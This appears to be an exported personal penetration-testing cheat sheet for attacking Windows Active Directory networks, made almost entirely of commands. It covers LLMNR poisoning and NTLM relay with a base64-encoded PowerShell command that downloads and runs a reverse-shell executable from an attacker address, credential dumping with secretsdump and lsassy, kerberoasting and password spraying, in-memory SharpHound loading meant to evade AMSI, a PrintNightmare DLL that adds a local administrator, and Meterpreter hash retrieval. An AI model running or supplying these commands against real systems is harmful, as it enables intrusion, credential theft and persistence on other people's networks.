<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>02-recon checklist</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>02-recon checklist</h1><br/><p><h2>Enumerate Network</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># find live hosts via ping </span><br />nmap -sP <span style="color:#7f0044;font-weight:400">$range</span> -vvv <span style="color:#ff9d00;font-weight:700">|grep</span> -v down<br /><span style="color:#0088ff;font-weight:400"># scan for nbetbios</span><br />netexec smb <span style="color:#7f0044;font-weight:400">$range</span> <br /><span style="color:#0088ff;font-weight:400">## find dc ip (search for ldap service recorded on SRV records)</span><br />nslookup -type=srv _ldap._tcp.dc._msdcs.<span style="color:#7f0044;font-weight:400">$root_domain</span><br /><br /><span style="color:#0088ff;font-weight:400">## setup /etc/hosts </span><br /><br /><span style="color:#0088ff;font-weight:400">## setup /etc/krb5.conf</span><br /><span style="color:#0088ff;font-weight:400">###e.g</span><br />[libdefaults]<br />  default_realm = <span style="color:#7f0044;font-weight:400">$root_domain</span><br />  kdc_timesync = 1<br />  ccache_type = 4<br />  forwardable = true<br />  proxiable = true<br />  fcc-mit-ticketflags = true<br />[realms]<br />  <span style="color:#7f0044;font-weight:400">$subdomain</span> = <span style="color:#ff9d00;font-weight:700">{</span><br />      kdc = <span style="color:#7f0044;font-weight:400">$dc01</span><br />      admin_server = <span style="color:#7f0044;font-weight:400">$dc01</span><br />  ....<br />  <br /><span style="color:#0088ff;font-weight:400">## NMAP </span><br />nmap -Pn -p- -sC -sV -oA nmap/full_scan_<span style="color:#7f0044;font-weight:400">$network</span> <span style="color:#7f0044;font-weight:400">$range</span>-<span style="color:#7f0044;font-weight:400">$ips</span></pre></div></p><p></p><p></p><p><h2>Enumerate users/shares anonymously</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## if anonymous connection is allowed </span><br />netexec smb <span style="color:#7f0044;font-weight:400">$target</span> --users <br />enum4linux <span style="color:#7f0044;font-weight:400">$target</span> <span style="color:#ff9d00;font-weight:700">|tee</span> enum4linux.log <br /><span style="color:#0088ff;font-weight:400">## -u $*user -p $pass</span><br /><br /><span style="color:#0088ff;font-weight:400"># if anonymous conn is disabled = create user_list + use kerberos (nmap/kerbrute)</span><br /><span style="color:#0088ff;font-weight:400">## valid username will either give TGT as AS-REP response or KRB5KDC_ERR_PREAUTH_REQUIRED signaling the user should pêrform pre auth </span><br />nmap -p 88 --script=krb5-enum-users --script-args=<span style="color:#3ad900;font-weight:400">&quot;krb5-enum-users.realm=&#39;$domain&#39;,userdb=$dict&quot;</span> <span style="color:#7f0044;font-weight:400">$target</span><br /><br /><span style="color:#0088ff;font-weight:400">## list shares </span><br />netexec smb <span style="color:#7f0044;font-weight:400">$target</span> -u <span style="color:#3ad900;font-weight:400">&#39;a&#39;</span> -p <span style="color:#3ad900;font-weight:400">&#39;&#39;</span> --shares</pre></div></p><p></p><p><h2>Poison/ntlm relay</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## LLMNR poisoning</span><br />responder <span style="color:#ff9d00;font-weight:700">-</span>I tun0<br />hashcat <span style="color:#ff9d00;font-weight:700">-</span>m <span style="color:#333333;font-weight:400">5600</span><br /><br /><span style="color:#0088ff;font-weight:400">## ntlm relay </span><br /><span style="color:#0088ff;font-weight:400">### start by hunting unsigned smb on targets (relay.txt is an arbitrary name tht track victim ips)</span><br />netexec smb hosts.txt <span style="color:#ff9d00;font-weight:700">--</span><span style="color:#00117f;font-weight:400">gen-relay-list</span> relay.txt<br /><span style="color:#0088ff;font-weight:400">### stop smb interception</span><br />sed <span style="color:#ff9d00;font-weight:700">-</span>i <span style="color:#333333;font-weight:400">&#39;s/HTTP = On/HTTP = Off/g&#39;</span> <span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tools<span style="color:#ff9d00;font-weight:700">/</span>Responder<span style="color:#ff9d00;font-weight:700">/</span>Responder.conf &amp;&amp; <span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tools<span style="color:#ff9d00;font-weight:700">/</span>Responder<span style="color:#ff9d00;font-weight:700">/</span>Responder.conf | grep <span style="color:#ff9d00;font-weight:700">--</span>color<span style="color:#ff9d00;font-weight:700">=</span>never <span style="color:#333333;font-weight:400">&#39;HTTP =&#39;</span><br />sed <span style="color:#ff9d00;font-weight:700">-</span>i <span style="color:#333333;font-weight:400">&#39;s/SMB = On/SMB = Off/g&#39;</span> <span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tools<span style="color:#ff9d00;font-weight:700">/</span>Responder<span style="color:#ff9d00;font-weight:700">/</span>Responder.conf &amp;&amp; <span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tools<span style="color:#ff9d00;font-weight:700">/</span>Responder<span style="color:#ff9d00;font-weight:700">/</span>Responder.conf | grep <span style="color:#ff9d00;font-weight:700">--</span>color<span style="color:#ff9d00;font-weight:700">=</span>never <span style="color:#333333;font-weight:400">&#39;SMB =&#39;</span><br /><span style="color:#0088ff;font-weight:400">### start relay </span><br />pwsh<br /><span style="color:#0088ff;font-weight:400">$text</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.49.51/rev.exe&#39;) | IEX&quot;</span><br /><span style="color:#0088ff;font-weight:400">$bytes</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetBytes(<span style="color:#0088ff;font-weight:400">$text</span>)<br /><span style="color:#0088ff;font-weight:400">$EncodedText</span> <span style="color:#ff9d00;font-weight:700">=</span> [Convert]<span style="color:#ff9d00;font-weight:700">::</span>ToBase64String(<span style="color:#0088ff;font-weight:400">$bytes</span>)<br /><span style="color:#0088ff;font-weight:400">$EncodedText</span><br /><br />sudo <span style="color:#00117f;font-weight:400">impacket-ntlmrelayx</span> <span style="color:#ff9d00;font-weight:700">--</span><span style="color:#00117f;font-weight:400">no-http-server</span> <span style="color:#ff9d00;font-weight:700">-</span>smb2support <span style="color:#ff9d00;font-weight:700">-</span>t <span style="color:#333333;font-weight:400">172.16</span>.<span style="color:#333333;font-weight:400">51.102</span> <span style="color:#ff9d00;font-weight:700">-</span>c <span style="color:#333333;font-weight:400">&#39;powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAHIAZQB2AC4AZQB4AGUAJwApACAAfAAgAEkARQBYAA==&#39;</span><br /><br />EXEC master..xp_dirtree <span style="color:#3ad900;font-weight:400">&quot;\\192.168.49.51\share&quot;</span><br /><span style="color:#0088ff;font-weight:400">####  -socks will start a socks proxy to use relayed authentication</span><br /><span style="color:#0088ff;font-weight:400">#### if admin account is relayed we can use secretsdump to get SAM database, LSA cached logon, machine account and some DPAPI informations </span><br />proxychains secretsdump <span style="color:#ff9d00;font-weight:700">-</span><span style="color:#00117f;font-weight:400">no-pass</span> <span style="color:#333333;font-weight:400">&#39;NORTH&#39;</span><span style="color:#ff9d00;font-weight:700">/</span><span style="color:#333333;font-weight:400">&#39;EDDARD.STARK&#39;</span>@<span style="color:#333333;font-weight:400">&#39;192.168.56.22&#39;</span><br /><span style="color:#0088ff;font-weight:400">### use lsassy to dump lsass remotely </span><br />proxychains lsassy <span style="color:#ff9d00;font-weight:700">--</span><span style="color:#00117f;font-weight:400">no-pass</span> <span style="color:#ff9d00;font-weight:700">-</span>d NORTH <span style="color:#ff9d00;font-weight:700">-</span>u EDDARD.STARK <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">56.22</span><br /></pre></div></p><p></p><p><h2>Get a password</h2></p><p><div class="codebox"><pre><br /><span style="color:#0088ff;font-weight:400">## asreproasting</span><br />GetNPUsers.py <span style="color:#7f0044;font-weight:400">$domain</span>/ -no-pass -usersfile users.txt<br /><br /><span style="color:#0088ff;font-weight:400">### on windows</span><br />Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose<br />. .<span style="color:#333333;font-weight:400">\A</span>SREPRoast.ps1<br />Invoke-ASREPRoast -Verbose<span style="color:#ff9d00;font-weight:700">|</span>fl<br /><span style="color:#0088ff;font-weight:400">### hashcat -m 18200</span><br /><br /><span style="color:#0088ff;font-weight:400">## pass spraying</span><br />netexec smb/winrm <span style="color:#7f0044;font-weight:400">$targets</span> -u users.txt -p users.txt --no-bruteforce<br /><span style="color:#0088ff;font-weight:400">### be careful when doing it as you can block accounts </span><br /><br /><span style="color:#0088ff;font-weight:400">## laps enum </span><br />Import-Module .<span style="color:#333333;font-weight:400">\L</span>APSToolkit.ps1<br /><span style="color:#0088ff;font-weight:400">## find groups that can fully enumerate laps data</span><br />Find-LAPSDelegatedGroups<br /><span style="color:#0088ff;font-weight:400">## look for group members </span><br />Get-NetGroupMember -GroupName <span style="color:#3ad900;font-weight:400">&quot;&quot;</span><br /><span style="color:#0088ff;font-weight:400">## enumerate hosts</span><br />Get-DomainComputer -Properties DnsHostName -Domain ops.comply.com <span style="color:#ff9d00;font-weight:700">|</span> ForEach-Object { Resolve-IPAddress -ComputerName <span style="color:#7f0044;font-weight:400">$_</span>.DnsHostName }<br /></pre></div></p><p><h2>AFter getting a user/pass</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## ask for TGT</span><br />getTGT.py <span style="color:#7f0044;font-weight:400">$domain</span>/<span style="color:#7f0044;font-weight:400">$user</span>:<span style="color:#7f0044;font-weight:400">$passwd</span><br /><span style="color:#ff9d00;font-weight:700">export</span> <span style="color:#7f0044;font-weight:400">KRB5CCNAME</span>=<span style="color:#7f0044;font-weight:400">$location_ccache</span><br /><span style="color:#0088ff;font-weight:400">## spray password / hash across all users </span><br />netexec smb hosts -u <span style="color:#7f0044;font-weight:400">$user</span> -H <span style="color:#7f0044;font-weight:400">$hash</span><br /><span style="color:#0088ff;font-weight:400">## enumerate smb </span><br />smbclient.py -k -no-pass @<span style="color:#7f0044;font-weight:400">$domain</span> <br /><br /><span style="color:#0088ff;font-weight:400">## enumerate all users </span><br />GetADUsers.py -all <span style="color:#7f0044;font-weight:400">$domain</span>/<span style="color:#7f0044;font-weight:400">$user</span>:<span style="color:#7f0044;font-weight:400">$pass</span><br /><br /><span style="color:#0088ff;font-weight:400">## windows host recon</span><br /><span style="color:#333333;font-weight:400">(new-object system.net.webclient).downloadstring(&#39;http://192.168.119.120/HostRecon.ps1&#39;) | IEX<br />Invoke-HostRecon<br /><br />## find dc <br />echo %LOGONSERVER%<br /><br />## kerberoasting<br />GetUserSPNs.py -request -dc-ip $target north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes<br />hashcat -m 13100 --force <br />## kerberoasting <br />proxychains /tmp/netexec ldap $dc -u yharrizi -p &#39;`6S14~jaXhQ!&#39; --kerberoasting output.txt<br /><br />## retest shares enum <br />netexec smb 192.168.56.10-23  -u $user -p $pass -d $domain --shares<br />net view \\$target /view \all <br />## enum dns (active directory integrate dns dump tool) <br />adidnsdump -u &#39;$domain\$user&#39; -p &#39;$pass&#39; $domain<br /><br />## bloodhound (try all domains) bowever python ingestor is not complete = need to test with .net ingestor<br />bloodhound-python --zip -c All -d $domain -u $user -p $pass -dc $dc --dns-tcp --disable-pooling<br />.\sharphound.exe -d $domain -c all --zipfilename $domain_bloodhound.zip<br />## sharpHound with reflection (need to bypass amsi)<br />$data = (New-Object System.Net.WebClient).DownloadData(&#39;http://192.168.56.1/SharpHound.exe&#39;)<br />$assem = [System.Reflection.Assembly]::Load($data)<br />[Sharphound.Program]::Main(&quot;-d north.sevenkingdoms.local -c all&quot;.Split())<br /><br />## check if we cann add michines MachgineACcountQuota <br />netexec ldap $domain -u $user -p $password -d $root_domain -M MAQ<br />## unset TGT <br />unset KRB5CCNAME<br /><br />## use statically compiled binaries <br />https://github.com/andrew-d/static-binaries<br /><br /># listen on the network (linux)<br />sudo tcpdump -i $interface -s 0 -W - -U |tee output.pcap |tcpdump -r <br /><br /># ssh password spraying <br />netexec ssh $targets -u $username -p $password <br /><br /></span><br /><br /></pre></div></p><p></p><p></p><p><h2>Other lateral movement</h2><ul><li></p><p>☐ DNS </li><li>constrained delegation (linux way better)</li><li>unconstrained delegation</li><li>Ressource based delegation</li><li>Object permissions</li><li><a href="12-_windows_credentials--SAM-LAPS_49.html">LAPS</a></li><li>pass the hash (pth)</li><li>Mimikatz</li><li>bloodhound</li><li> <a href="13-windows_lateral-movement--RDP_31.html">RDP / SharpRDP</a></li><li>web application</li><li><a href="14-linux_lateral_movement--kerberos_on_linux_28.html">keytab</a> </li><li><a href="14-linux_lateral_movement--Devops_27.html">ansible</a></li><li><a href="12-_windows_credentials--seimpersonate_exploit_404.html">seimpersonate privilege : spoolss</a></li><li><a href="13-windows_lateral-movement--Fileless_Lateral_movement_52.html">fileless latera movement</a>*</li><li>adcs (certipy)</li><li><a href="13-windows_lateral-movement--RDP_31.html">RDP thief </a></li><li><a href="15-MSSQL_attackss_29.html">MSSQL</a></li></ul></p><p> </p><p></p><p><h2>Other CVES</h2></p><p><ul><li>noPac (patched on DC): CVE-2021-42287<ul><li><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></li><li>if dc vlnerable it will return a TGT without a pack</li></ul></li><li>PrintNghtmare <ul><li>exploit spooler service</li><li></li></ul></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## check if spooler is running</span><br />netexec smb 192.168.56.10-23 -M spooler<br /><span style="color:#0088ff;font-weight:400">## create nightare.c </span><br /><span style="color:#333333;font-weight:400">````</span>c<br /><span style="color:#0088ff;font-weight:400">#include &lt;windows.h&gt; </span><br /><br />int RunCMD<span style="color:#ff9d00;font-weight:700">()</span><br /><span style="color:#ff9d00;font-weight:700">{</span><br />    system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;net users pnightmare Passw0rd123. /add&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br />    system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;net localgroup administrators pnightmare /add&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br />    <span style="color:#ff9d00;font-weight:700">return</span> 0<span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">}</span><br /><br />BOOL APIENTRY DllMain<span style="color:#ff9d00;font-weight:700">(</span>HMODULE hModule,<br />    DWORD ul_reason_for_call,<br />    LPVOID lpReserved<br /><span style="color:#ff9d00;font-weight:700">)</span><br /><span style="color:#ff9d00;font-weight:700">{</span><br />    switch <span style="color:#333333;font-weight:400">(ul_reason_for_call)</span><br />    <span style="color:#ff9d00;font-weight:700">{</span><br />    <span style="color:#ff9d00;font-weight:700">case</span> DLL_PROCESS_ATTACH:<br />        <span style="color:#ffdd00;font-weight:400">RunCMD()</span><span style="color:#ff9d00;font-weight:700">;</span><br />        <span style="color:#ff9d00;font-weight:700">break;</span><br />    <span style="color:#ff9d00;font-weight:700">case</span> DLL_THREAD_ATTACH:<br />    <span style="color:#ff9d00;font-weight:700">case</span> DLL_THREAD_DETACH:<br />    <span style="color:#ff9d00;font-weight:700">case</span> DLL_PROCESS_DETACH:<br />        <span style="color:#ff9d00;font-weight:700">break;</span><br />    <span style="color:#ff9d00;font-weight:700">}</span><br />    <span style="color:#ff9d00;font-weight:700">return</span> TRUE<span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">}</span><br /><span style="color:#333333;font-weight:400">````</span><br /><span style="color:#0088ff;font-weight:400"># compile it </span><br />x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c<br /><span style="color:#0088ff;font-weight:400"># clone exploit</span><br />git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare<br /><span style="color:#0088ff;font-weight:400"># prepare smb share with dll </span><br /><span style="color:#0088ff;font-weight:400">## exploit </span><br />python3 CVE-2021-1675.py essos.local/jorah.mormont:<span style="color:#3ad900;font-weight:400">&#39;H0nnor!&#39;</span>@meereen.essos.local <span style="color:#3ad900;font-weight:400">&#39;\\192.168.56.1\ATTACKERSHARE\nightmare.dll&#39;</span><br /></pre></div></p><p></p><p></p><p></p><p></p><p></p><p><h2>Meterpreter special commands</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># take screenshot </span><br />screengrab<br /><span style="color:#0088ff;font-weight:400"># edit interactively file</span><br />edit <span style="color:#0088ff;font-weight:400">$file</span><br /><span style="color:#0088ff;font-weight:400"># move local dirs </span><br />lcd &amp;&amp; lpwd <br /><span style="color:#0088ff;font-weight:400"># execute python</span><br />load python	<br /><span style="color:#0088ff;font-weight:400">## load kiwi</span><br />load kiwi<br /><br /><span style="color:#0088ff;font-weight:400">### retrieve ntlm hashes</span><br />	creds_msv<br />creds_all</pre></div></p></div>
</body>
</html>
